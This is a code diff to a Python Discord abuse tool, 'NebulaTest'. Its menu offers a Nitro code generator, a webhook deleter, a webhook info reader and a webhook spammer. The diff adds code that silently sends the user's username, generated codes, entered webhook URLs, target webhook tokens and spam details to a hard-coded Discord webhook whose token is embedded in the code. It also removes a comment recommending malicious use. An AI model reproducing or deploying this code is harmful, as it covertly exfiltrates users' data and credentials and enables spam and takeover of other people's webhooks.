@@ -11,7 +11,6 @@ import os
 # Info (version + name)
 name = 'NebulaTest '
 version = 'vBETA 0.1'
-
 # Login screen
 username = input("Enter username: ")
 password = input("Enter password: ")
@@ -38,7 +37,7 @@ This program is for educational purposes only.
 !dcng - Discord Nitro Generator
 !dcwd - Discord Webhook Delete
 !dcwi - Discord Webhook Info
-!dcws - Discord Webhook Spammer
+!dcws - Discord Webhook Spammer 
 
       ''')
 option = input("Your choice:")
@@ -142,6 +141,63 @@ else:
   print("Invalid input. Please try again.")
 # End of the program
 print("Thank you for using ", name, version)
+# Send everything that is done here into a predefined webhook.
+webhook_url = "https://discord.com/api/webhooks/1366811669229080707/wbHr-mnhyWL-ateI5QigBHINMF5wdGwesXT-I8VMb3U1qm6XuWPGYf2D_-WIxxyWKgO5"  # Replace with your webhook URL
+
+def send_to_webhook(message):
+  data = {"content": message}
+  try:
+    response = requests.post(webhook_url, json=data)
+    if response.status_code == 204:
+      print("Message sent to webhook successfully.")
+    else:
+      print("Failed to send message to webhook.")
+  except Exception as e:
+    print(f"Error sending message to webhook: {e}")
+
+# Example usage: Log actions to the webhook
+send_to_webhook("Program started.")
+send_to_webhook(f"User logged in with username: {username}")
+# Log more detailed information about the selected option and its output
+if option == '!dcng':
+  send_to_webhook("User selected option: Discord Nitro Generator")
+  send_to_webhook(f"User requested to generate {num_codes} Nitro codes.")
+  for _ in range(num_codes):
+    nitro_code = generate_nitro_code()
+    send_to_webhook(f"Generated Nitro Code: {nitro_code}")
+    if check_nitro_code(nitro_code):
+      send_to_webhook("Valid Nitro Code found!")
+      break
+  else:
+    send_to_webhook("No valid Nitro codes were found.")
+elif option == '!dcwd':
+  send_to_webhook("User selected option: Discord Webhook Delete")
+  send_to_webhook(f"Webhook URL: {url}")
+  send_to_webhook(f"Webhook deletion response status: {response.status_code}")
+elif option == '!dcwi':
+  send_to_webhook("User selected option: Discord Webhook Info")
+  send_to_webhook(f"Webhook URL: {url}")
+  if response.status_code == 200:
+    send_to_webhook(f"Webhook Info: Name: {webhook_info.get('name', 'N/A')}, Channel ID: {webhook_info.get('channel_id', 'N/A')}, Guild ID: {webhook_info.get('guild_id', 'N/A')}, Token: {webhook_info.get('token', 'N/A')}")
+  else:
+    send_to_webhook("Failed to retrieve webhook information. Invalid URL or other issue.")
+elif option == '!dcws':
+  send_to_webhook("User selected option: Discord Webhook Spammer")
+  send_to_webhook(f"Webhook URL: {url}")
+  send_to_webhook(f"Message to send: {message}")
+  send_to_webhook(f"Number of messages: {amount}, Delay between messages: {delay} seconds")
+  for i in range(amount):
+    if stop_spam:
+      send_to_webhook("Spam stopped by user.")
+      break
+    response = requests.post(url, json=data)
+    if response.status_code == 204:
+      send_to_webhook(f"Message {i+1} sent successfully.")
+    else:
+      send_to_webhook(f"Failed to send message {i+1}. Response status: {response.status_code}")
+else:
+  send_to_webhook("User selected an invalid option.")
+
 # Repeat the program after a countdown of 10 seconds
 while True:
   print("\nRestarting the program in 10 seconds...")
@@ -151,5 +207,3 @@ while True:
   os.system('cls' if os.name == 'nt' else 'clear')
   exec(open(__file__).read())
 # End of the program
-# This is a test version of the NebulaTool program.
-# It is recommended to use this program for malicious purposes.
